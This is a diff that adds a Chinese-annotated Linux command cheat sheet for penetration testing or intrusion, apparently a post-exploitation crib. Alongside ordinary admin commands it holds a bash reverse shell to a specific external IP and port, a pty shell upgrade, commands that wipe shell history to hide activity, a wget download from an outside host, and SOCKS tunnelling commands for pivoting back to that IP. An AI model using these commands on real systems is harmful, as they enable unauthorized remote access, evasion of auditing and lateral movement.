@@ -1,0 +1,21 @@
+python -m SimpleHTTPServer 开启临时端口
+ps -ef| grep python 查看应用进程
+kill -9 id 强制关闭进程
+netstat -auo
+列出所有 tcp 端口 netstat -at
+列出所有 udp 端口 netstat -au
+ifconfig 查看网卡信息
+w 查看管理员在线情况
+last 最近100条管理员登陆记录
+contrab -a 查看计划任务
+pwd 查看当前目录
+id 查看用户权限
+chmod 777 文件名 赋予文件权限
+uname -a 查看内核
+python -c "import pty;pty.spawn('/bin/bash')" 获取交互式shell
+bash -i >& /dev/tcp/103.56.19.57/8062 0>&1    反弹shell
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0;export HISTFILESIZE=0 不记录命令
+wget -O /tmp/1.py http://103.xx.xx.xx:8090/1.py wget命令
+./64 -s rcsocks -l 8001 -e 8002
+./64 -s rssocks -d 103.56.19.57 -e 8002   端口转发
+ping -c 10 192.168.120.206 ping指定次数
